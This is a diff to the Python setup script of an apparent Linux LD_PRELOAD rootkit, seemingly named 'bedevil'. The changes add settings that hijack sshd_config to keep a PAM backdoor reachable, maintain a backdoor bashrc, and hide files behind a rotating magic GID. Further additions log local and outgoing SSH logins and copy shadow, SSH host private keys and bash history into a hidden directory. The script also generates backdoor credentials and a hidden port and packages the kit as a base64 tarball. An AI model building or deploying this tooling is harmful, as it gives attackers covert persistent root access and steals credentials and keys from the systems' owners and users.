@@ -8,7 +8,32 @@ BD_UNAME = 'changeme'
 BD_PWD   = None
 PAM_PORT = None
 
+
+PATCH_SSHD_CONFIG = True # makes sure the PAM backdoor stays accessible by hijacking sshd_config.
+ROOTKIT_BASHRC    = True # the rootkit will write & maintain the bashrc so it stays the way it should.
+                         # as opposed to just copying it to the installation once before installation.
+
+READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
+AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
+GID_CHANGE_MINTIME = 60 * 30
+HIDE_MY_ASS = True  # keep track of hidden things outside the installation directory. for rehiding upon GID change.
+
+LOG_LOCAL_AUTH = True # log successful auths for users on the box.
+LOG_SSH = True # log outgoing ssh login attempts.
+
+# "steal" files that may be of interest. they will be updated if there are changes in size.
+FILE_STEAL = True
+INTERESTING_FILES = ["passwd", "shadow", "sshd_config", "ssh_config", "ssh_host_dsa_key",
+                     "ssh_host_dsa_key.pub", "ssh_host_ecdsa_key", "ssh_host_ecdsa_key.pub",
+                     "ssh_host_ed25519_key", "ssh_host_ed25519_key.pub", "ssh_host_rsa_key",
+                     "ssh_host_rsa_key.pub", "apache.log", "known_hosts", ".bash_history"]
+
+USE_CRYPT = True
+
+
 # END OF SETTINGS
+
+
 
 
 
@@ -19,13 +44,10 @@ from string import ascii_uppercase, ascii_lowercase, digits
 from random import choice
 from os import listdir, system, unlink
 from os.path import join, basename
+from binascii import hexlify
 
 
 
-# 'random' paths we've already got.
-USED_PATHS = []
-# stores all names of hooked funcs
-ALL_HOOKS = []
 
 class Util():
     def randgarb(self, garbset, garblen):
@@ -54,6 +76,13 @@ class Util():
             newpath = self.randpath(maxlen)
         USED_PATHS.append(newpath)
         return newpath
+
+    def randpaths(self, count):
+        allpaths = []
+        for i in range(count):
+            maxlen = choice(range(2, 5))
+            allpaths.append(self.randpath())
+        return allpaths
 
 
 class Definitions():
@@ -103,12 +132,13 @@ class Definitions():
 
 
 # handy class. trusty class. thank you class.
-class CArray():
-    def __init__(self, name, sizedef, alist):
+class CArray(): # default is assumed to be an array of char pointers
+    def __init__(self, name, sizedef, alist, arrtype='charp'):
         self.array_name = name
         self.size_name = sizedef
         self.list_len = len(alist)
         self.array_list = alist
+        self.arrtype = arrtype
 
     # define size of the array to be created.
     def getsizedef(self):
@@ -117,15 +147,23 @@ class CArray():
         return size_def
 
     # setup the beginning of the array.
-    def declarearr(self):
+    def declarecharparray(self):
         declaration = 'static char *const {0}[{1}] = '
+        declaration = declaration.format(self.array_name, self.size_name)
+        return declaration
+
+    def declarechararray(self):
+        declaration = 'static char const {0}[{1}] = '
         declaration = declaration.format(self.array_name, self.size_name)
         return declaration
 
     # build elements of target array.
     def buildelems(self, elems='{'):
         for elem in self.array_list:
-            elems += '"{0}",'.format(elem)
+            if self.arrtype == 'charp':
+                elems += '"{0}",'.format(elem)
+            else:
+                elems += '{0},'.format(elem)
         elems = elems[:-1]  # remove trailing comma.
         elems += '};\n'
         return elems
@@ -133,10 +171,18 @@ class CArray():
     # create full C array.
     def create(self):
         result = self.getsizedef()
-        result += self.declarearr()
+        if self.arrtype == 'charp':
+            result += self.declarecharparray()
+        elif self.arrtype == 'char':
+            result += self.declarechararray()
         result += self.buildelems()
         return result
 
+
+# 'random' paths we've already got.
+USED_PATHS = []
+# stores all names of hooked funcs
+ALL_HOOKS = []
 
 # bunch of settings related stuff...
 ut = Util()
@@ -144,7 +190,7 @@ ut = Util()
 if BD_UNAME == None:
     BD_UNAME = ut.randgarb(ascii_lowercase, 7)
 if BD_PWD == None:
-    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 9)
+    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 8)
 if PAM_PORT == None:
     PAM_PORT = choice(range(11111, 63556))
 
@@ -152,55 +198,51 @@ print('Username: ' + BD_UNAME)
 print('Password: ' + BD_PWD)
 print('Hidden port: ' + str(PAM_PORT))
 
-_BD_PWD = BD_PWD # just to show it at the end
-BD_PWD = ut.cryptpw(BD_PWD)
-
-MAGIC_GID = ut.randgarb(digits.replace('0',''), 6)
-GID_PATH = ut.randpath(5)
-GIDTIME_PATH = ut.randpath(5)
-BD_VAR = ut.randgarb(ascii_uppercase, 9)
-#print('Magic GID: ' + str(MAGIC_GID))
-#print('Magic environment variable: ' + BD_VAR)
+MAGIC_GID = choice(range(22222222, 66666666))
 
 INSTALL_DIR = ut.randpath(7)
 BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
 SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
-PRELOAD_FILE = ut.randpath(10)
-#print('Install directory: ' + INSTALL_DIR)
-#print('bdvl SO: ' + BDVLSO)
-#print('SO path: ' + SOPATH)
 
-HIDEPORTS = ut.randpath(7)
-SSH_LOGS = ut.randpath(7)
-INTEREST_DIR = ut.randpath(7)
-SSHD_CONFIG = ut.randpath(7)
-
-INC = 'inc'
-NEW_INC = 'new_inc'
+INC      = 'inc'
+NEW_INC  = 'new_inc'
+CONFIGH      = NEW_INC + '/config.h'
+HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
+SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads stuff from here to install the kit.
 
 BDVLH = NEW_INC + '/bedevil.h'
-
-SETTINGS = {
-    'BD_UNAME':BD_UNAME,         'BD_PWD':BD_PWD,
-    'MAGIC_GID':int(MAGIC_GID),  'BD_VAR':BD_VAR,
-    'INSTALL_DIR':INSTALL_DIR,   'BDVLSO':BDVLSO,
-    'SOPATH':SOPATH,             'PRELOAD_FILE':PRELOAD_FILE,
-    'SSH_LOGS':SSH_LOGS,         'INTEREST_DIR':INTEREST_DIR,
-    'HIDEPORTS':HIDEPORTS,       'GID_PATH':GID_PATH,
-    'GIDTIME_PATH':GIDTIME_PATH, 'PAM_PORT':int(PAM_PORT),
-    'SSHD_CONFIG':SSHD_CONFIG,
+SETTINGS = { # all of these are written to bedevil.h
+    'BD_UNAME':BD_UNAME,                  'BD_PWD':ut.cryptpw(BD_PWD),
+    'MAGIC_GID':int(MAGIC_GID),           'BD_VAR':ut.randgarb(ascii_uppercase, 9),
+    'INSTALL_DIR':INSTALL_DIR,            'BDVLSO':BDVLSO,
+    'SOPATH':SOPATH,                      'PRELOAD_FILE':ut.randpath(10),
+    'SSH_LOGS':ut.randpath(7),            'INTEREST_DIR':ut.randpath(7),
+    'HIDEPORTS':ut.randpath(7),           'GID_PATH':ut.randpath(5),
+    'GIDTIME_PATH':ut.randpath(5),        'PAM_PORT':int(PAM_PORT),
+    'SSHD_CONFIG':'/etc/ssh/sshd_config', 'BASHRC_PATH':INSTALL_DIR+'/.bashrc'
 }
 
+LINKPATHS = { # the following paths are linked to within the installation directory.
+    SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
+    SETTINGS['INTEREST_DIR']:'interest_dir'
+}
 
+# these must be checked & based on the values, subsequently written to config.h
+# so that the kit knows what stuff to do & what not to do.
+CHECKTHESE = {
+        'PATCH_SSHD_CONFIG':PATCH_SSHD_CONFIG,   'ROOTKIT_BASHRC':ROOTKIT_BASHRC,
+        'READ_GID_FROM_FILE':READ_GID_FROM_FILE, 'AUTO_GID_CHANGER':AUTO_GID_CHANGER,
+        'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME, 'HIDE_MY_ASS':HIDE_MY_ASS,
+        'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,         'LOG_SSH':LOG_SSH,
+        'FILE_STEAL':FILE_STEAL,                 'USE_CRYPT':USE_CRYPT
+}
 
 # read the list of hooked function names from libdl directory &
 # create C arrays for them where the contents are referenced by
 # the hook() & call() macro wrappers & their functions defined
 # in libdl.h.
 def gethooks():
-    hookspath = NEW_INC + '/hooks/libdl/hooks'
-
-    fd = open(hookspath, 'r')
+    fd = open(HOOKS_PATH, 'r')
     contents = fd.read().split('\n')
     fd.close()
 
@@ -232,24 +274,52 @@ def gethooks():
 
 
 def setupcfg():
+    # these are settings that auto.sh must be able to read & use to install the kit.
     targets = ['MAGIC_GID', 'INSTALL_DIR', 'PRELOAD_FILE', 'BDVLSO',
                'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
                'BD_VAR', 'GID_PATH', 'GIDTIME_PATH']
 
-    fd = open(NEW_INC+'/settings.cfg', 'a')
-    for target in targets:
-        try:
-            fd.write(SETTINGS[target]+'\n')
-        except:
-            fd.write(str(SETTINGS[target])+'\n')
+    fd = open(SETTINGS_CFG, 'w')
+    fd.write('\n'.join(str(SETTINGS[target]) for target in targets))
     fd.close()
+
+def checktoggles(keys, values):
+    count = len(keys)
+    okhere = ''
+    for i in range(count):
+        if values[i] == True:
+            okhere += '#define {0}\n'.format(keys[i])
+    return okhere
+
+# hex the contents of a path & return it as a char array.
+def hexarraylifypath(path, arrname, sizedef):
+    fd = open(path, 'rb')
+    contents = fd.read()
+    fd.close()
+
+    contentshex = hexlify(contents)
+    contentslist = ['0x' + contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
+    contentsarr = CArray(arrname, sizedef, contentslist, arrtype='char')
+    return contentsarr.create()
 
 
 def setup_config():
     copytree(INC, NEW_INC)
 
-    KEYS   = SETTINGS.keys()
-    VALUES = SETTINGS.values()
+    # determine the status of stuff & define it if needed
+    KEYS = list(CHECKTHESE.keys())
+    VALUES = list(CHECKTHESE.values())
+    configh = checktoggles(KEYS, VALUES)
+    if AUTO_GID_CHANGER == True:
+        configh += '#define GID_CHANGE_MINTIME {0}\n'
+        configh = configh.format(GID_CHANGE_MINTIME)
+    fd = open(CONFIGH, 'a')
+    fd.write(configh)
+    fd.close()
+
+    # write all settings & values to bedevil.h
+    KEYS   = list(SETTINGS.keys())
+    VALUES = list(SETTINGS.values())
     gotbdvlh = gethooks()
 
     for settingi in range(len(SETTINGS)):
@@ -268,7 +338,9 @@ def setup_config():
         except:
             gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
 
-    gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
+    if HIDE_MY_ASS == True:
+        gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
+
     defs = Definitions(ALL_HOOKS)
     gotbdvlh += defs.getidents()
 
@@ -277,32 +349,47 @@ def setup_config():
     gotbdvlh += allhooksarr.create()
     gotbdvlh += 'syms symbols[{0}];\n'.format(allhookssiz)
 
+    fd = open('etc/.rolf', 'r')
+    rolf = fd.read().strip().split('\n')
+    fd.close()
+    rolfarr = CArray('rolfs', 'ROLFS_SIZE', rolf)
+    gotbdvlh += rolfarr.create()
+
+    if FILE_STEAL == True:
+        bashrcarr = CArray('interesting_files', 'INTERESTING_FILES_SIZE', INTERESTING_FILES)
+        gotbdvlh += bashrcarr.create()
+
+    alllinkpaths = []
+    KEYS = list(LINKPATHS.keys())
+    VALUES = list(LINKPATHS.values())
+    for i in range(len(KEYS)):
+        thislinkpath = '{0}:{1}'.format(KEYS[i], INSTALL_DIR+'/'+VALUES[i])
+        alllinkpaths.append(thislinkpath)
+
+    linkpathsarr = CArray('linkpaths', 'LINKPATHS_SIZE', alllinkpaths)
+    gotbdvlh += linkpathsarr.create()
+
     # bedevil.h complete. write it.
     fd = open(BDVLH, 'w')
     fd.write(gotbdvlh)
     fd.close()
 
-    # cp backdoor shell files.
-    copy('etc/.rolf', NEW_INC+'/.rolf')
-    copy('etc/.bashrc', NEW_INC+'/.bashrc')
-
-    # write magic GID value so auto.sh can cat it into GID_PATH.
-    fd = open(NEW_INC+'/magic_gid', 'w')
-    fd.write(str(SETTINGS['MAGIC_GID']))
-    fd.close()
+    # backdoor shell stuff...
+    if ROOTKIT_BASHRC == False:
+        copy('etc/.bashrc', NEW_INC+'/.bashrc')
 
     # write all the settings auto.sh needs.
     setupcfg()
 
     # mk tar.gz of include dir. b64 it. rm it.
     system('tar cpfz {0}.tar.gz {1}'.format(BD_UNAME, NEW_INC))
-    fd = open(BD_UNAME+'.tar.gz', 'r')
+    fd = open(BD_UNAME+'.tar.gz', 'rb')
     targzb64 = b64encode(fd.read())
     fd.close()
     unlink(BD_UNAME+'.tar.gz')
     
     # write b64.
-    fd = open(BD_UNAME+'.b64', 'w')
+    fd = open(BD_UNAME+'.b64', 'wb')
     fd.write(targzb64)
     fd.close()
 
@@ -311,6 +398,6 @@ def setup_config():
 
 if __name__ == '__main__':
     setup_config()
-    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), _BD_PWD)
+    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), BD_PWD)
     print('\n\t\033[1;31m{0}\033[0m\n'.format(template))
 
